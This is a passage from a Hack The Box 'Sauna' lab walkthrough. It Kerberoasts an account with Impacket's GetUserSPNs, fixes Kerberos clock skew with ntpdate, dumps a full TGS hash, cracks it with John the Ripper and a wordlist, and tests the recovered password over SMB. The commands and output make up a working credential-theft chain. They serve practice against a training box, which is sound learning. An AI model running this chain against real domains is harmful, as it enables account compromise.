# Kerberoasting HSmith
Run GetUserSPNs to list all AD users which have Service Principal Names.

```plaintext
root@Kali:~/HTB/Sauna# GetUserSPNs.py egotistical-bank.local/fsmith:Thestrokes23 -request -dc-ip 10.10.10.175
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName                      Name    MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------------------------  ------  --------  --------------------------  ---------  ----------
SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111  HSmith            2020-01-23 13:54:34.140321  <never>               



[-] SPN: SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111 - Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
We get that error. To resolve that, I Googled and [found this](https://www.digitalmunition.me/zero-to-hero-episode-10-ms17-010eternalblue-gppcpasswords-and-kerberoasting/):

> Quick troubleshooting:
> If you're in a different timezone when running [GetUserSPNs.py](http://GetUserSPNs.py) you will get this error: KRB_AP_ERR_SKEW(Clock skew too great) you can solve it using ntpdate, which can be installed with apt, you can then synchronize your time with the machine's time with "ntpdate 10.10.10.100" (or any ip), however it might give you an offset, mine returned an offset of -813.461087 sec which is around 14 minutes less than my actual time, so I changed it manually in kali settings and it finally worked 😉
> You could also just query the NTP using: ntpdate -qu 10.10.10.100 and completely change it manually.

I didn't have ntpdate installed so I installed it with `apt install ntpdate` Before syncing our time with box let's check how large the difference is.

```shell
root@Kali:~/HTB/Sauna# ntpdate -qu 10.10.10.175
server 10.10.10.175, stratum 1, offset +25204.803581, delay 0.04257
17 Oct 21:32:10 ntpdate[39682]: step time server 10.10.10.175 offset +25204.803581 sec
```

We are about 7 hours behind the box. We can proceed to set our time the same as the box, but this will screw up your machine somewhat, I had notes in Joplin created after this "jump" back in time. To sync the time do this

```shell
root@Kali:~/HTB/Sauna# ntpdate sauna.egotistical-bank.local
18 Oct 04:39:21 ntpdate[39751]: step time server 10.10.10.175 offset +28866.613478 sec
root@Kali:~/HTB/Sauna# date
Sun Oct 18 04:39:24 +08 2020
```

Now we can get HSmith's hashes

```shell
root@Kali:~/HTB/Sauna# GetUserSPNs.py egotistical-bank.local/fsmith:Thestrokes23 -request
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName                      Name    MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------------------------  ------  --------  --------------------------  ---------  ----------
SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111  HSmith            2020-01-23 13:54:34.140321  <never>               



$krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$SAUNA/HSmith.EGOTISTICALBANK.LOCAL~60111*$7bb5255d6d472d7f5a66f33c3de3002e$a8619ed3eae71392279497429933001da761be70c3b9cf033c7eb18e4f326e69be15b9c2a3cfe03165a0f3844f74097d89c8d4cda9b2c91b545cb17030e7bf4ea8a2d8075b49686a44cc8528ecdf09217555ddb73b79589885008d3ba23fd2ff7a58e949bcaa29e4bf96208661b4a83673baae5ff7ca07984b678a292da59d161fe0e11bd4eacd6d583eb282b6f0fd058395d329c47acc5caab3b866183837540ca0522ab4629515f7b4f496733b9934f43a58f69cb0db229a8c177df02b9884cdd515616f5a78e5ebe69e59c12c278cc957537063fba26d8bb362b8d1ef8cc282ba40f732e4c09c25c4fad2ecc42a4ff37ab9042afad3803b2e06818069d5ff9880d0a78345598f3e76455ace929c95d313fed18446f2ee90902a9620aac88b3fa9a9721b7c5c9352d1ff8999b68bb161c1ed9aafdf4e025a7ab3b1ecc9ee5adefc2159ccddabcc90a6d0225b949e62b1b375dd6f2494ca3fb6b9662e050282a876dd7a79692622a99bf602fb4214bdade119dc6a12e5f01997154f30746b5a9da6a0482aee57a79a21c1de57dee55e85656e74e79cb1229af223f05e48cb280be1c30ed38bb4588e50e07d9cb2c686dd170aab09482fbabcd1273b45079925be22bf7f941ea81ee61662c33d8989c71e8b67f28eab3b34953b6589a7d97bad669f5165a265abe4c96a773a99a22215fe7ba699f11acc832107fef73282dc5dd0a9f0b226214483b80dbc6aad51bc75eb46c6719334f429b1c9b0748a90d471a21ec3e7c84926637d764cc8eb7c8b6788a815e13cf8367127c10e22c4008c15af84d02ec9762d7b7c2396f25a8a5fcf9851367e394cfd7a2c6c78f30bbd42cc44228de5b58ec7e7280b46e6fd9d127217ff470094f8fad83aec8d474d6e70191dcfca3b4f2b35650149dc14f082b276d8ffe62624802a40ce4821600164bf0ba1b20878398f9a5129eaf66f1898ce9a088f90cc1551ebf36af9a2d5d246770da1753e1ebab27fdd5a1c3c0c1b84153ff86cb9f564ecca607f2a62e18b2c4f0316557503fba3ea30f5af06e65c680f78e84f45a7bb5f28a93cdb0e3fc0ea1466e8931fc1f360c6fa9c1bb845e4853c09b6129394a26aacb26c1ae70be1d9eb43b5fc8696a40bd60263709c4c1271857d602e7f8627d75cb43707de195cbd4c981fd8fec0132376361ec9f05673287dc8e7c78df57e019a70bf54d58492e8c94860c68643e8b0360ea4977b6cdc7f06bf41bb9203e66cda31b0d83bf6b54d14a863359a2f5756af8d1a17c885f88ebd7aab1820611af764b1beea71a17be799dfb56a3b971df2c15c9573da4aed36d3e20918ea9667da58cdf85ca96a279118c1a763f34aba5b81b77783a29f6d53af76b9054b15ba836afd00917e3b0853b2079660fb872e
```

Now crack it with john.

```shell
root@Kali:~/HTB/Sauna# cat hsmith.hash 
$krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$SAUNA/HSmith.EGOTISTICALBANK.LOCAL~60111*$7bb5255d6d472d7f5a66f33c3de3002e$a8619ed3eae71392279497429933001da761be70c3b9cf033c7eb18e4f326e69be15b9c2a3cfe03165a0f3844f74097d89c8d4cda9b2c91b545cb17030e7bf4ea8a2d8075b49686a44cc8528ecdf09217555ddb73b79589885008d3ba23fd2ff7a58e949bcaa29e4bf96208661b4a83673baae5ff7ca07984b678a292da59d161fe0e11bd4eacd6d583eb282b6f0fd058395d329c47acc5caab3b866183837540ca0522ab4629515f7b4f496733b9934f43a58f69cb0db229a8c177df02b9884cdd515616f5a78e5ebe69e59c12c278cc957537063fba26d8bb362b8d1ef8cc282ba40f732e4c09c25c4fad2ecc42a4ff37ab9042afad3803b2e06818069d5ff9880d0a78345598f3e76455ace929c95d313fed18446f2ee90902a9620aac88b3fa9a9721b7c5c9352d1ff8999b68bb161c1ed9aafdf4e025a7ab3b1ecc9ee5adefc2159ccddabcc90a6d0225b949e62b1b375dd6f2494ca3fb6b9662e050282a876dd7a79692622a99bf602fb4214bdade119dc6a12e5f01997154f30746b5a9da6a0482aee57a79a21c1de57dee55e85656e74e79cb1229af223f05e48cb280be1c30ed38bb4588e50e07d9cb2c686dd170aab09482fbabcd1273b45079925be22bf7f941ea81ee61662c33d8989c71e8b67f28eab3b34953b6589a7d97bad669f5165a265abe4c96a773a99a22215fe7ba699f11acc832107fef73282dc5dd0a9f0b226214483b80dbc6aad51bc75eb46c6719334f429b1c9b0748a90d471a21ec3e7c84926637d764cc8eb7c8b6788a815e13cf8367127c10e22c4008c15af84d02ec9762d7b7c2396f25a8a5fcf9851367e394cfd7a2c6c78f30bbd42cc44228de5b58ec7e7280b46e6fd9d127217ff470094f8fad83aec8d474d6e70191dcfca3b4f2b35650149dc14f082b276d8ffe62624802a40ce4821600164bf0ba1b20878398f9a5129eaf66f1898ce9a088f90cc1551ebf36af9a2d5d246770da1753e1ebab27fdd5a1c3c0c1b84153ff86cb9f564ecca607f2a62e18b2c4f0316557503fba3ea30f5af06e65c680f78e84f45a7bb5f28a93cdb0e3fc0ea1466e8931fc1f360c6fa9c1bb845e4853c09b6129394a26aacb26c1ae70be1d9eb43b5fc8696a40bd60263709c4c1271857d602e7f8627d75cb43707de195cbd4c981fd8fec0132376361ec9f05673287dc8e7c78df57e019a70bf54d58492e8c94860c68643e8b0360ea4977b6cdc7f06bf41bb9203e66cda31b0d83bf6b54d14a863359a2f5756af8d1a17c885f88ebd7aab1820611af764b1beea71a17be799dfb56a3b971df2c15c9573da4aed36d3e20918ea9667da58cdf85ca96a279118c1a763f34aba5b81b77783a29f6d53af76b9054b15ba836afd00917e3b0853b2079660fb872e
root@Kali:~/HTB/Sauna# john --wordlist=/usr/share/wordlists/rockyou.txt hsmith.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     (?)
1g 0:00:00:06 DONE (2020-10-18 04:41) 0.1594g/s 1680Kp/s 1680Kc/s 1680KC/s Thrall..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Surprisingly it showed the same password as that of fsmith. Let's check if the user has additional privileges fsmith doesn't have.

```shell
root@Kali:~/HTB/Sauna# smbmap -u HSmith -p Thestrokes23 -H sauna.egotistical-bank.local
[+] Finding open SMB ports....
[!] Authentication error occured
[!] SMB SessionError: STATUS_PASSWORD_EXPIRED(The user account password has expired.)
[!] Authentication error on sauna.egotistical-bank.local

root@Kali:~/HTB/Sauna# smbclient -U 'HSmith%Thestrokes23' -L //sauna.egotistical-bank.local
WARNING: The "syslog" option is deprecated
WARNING: The "syslog" option is deprecated
session setup failed: NT_STATUS_PASSWORD_EXPIRED
```

So the password has expired, preventing us from authenticating with that. There appears to be no way around this outside the box. We can't do anything else with this account it seems.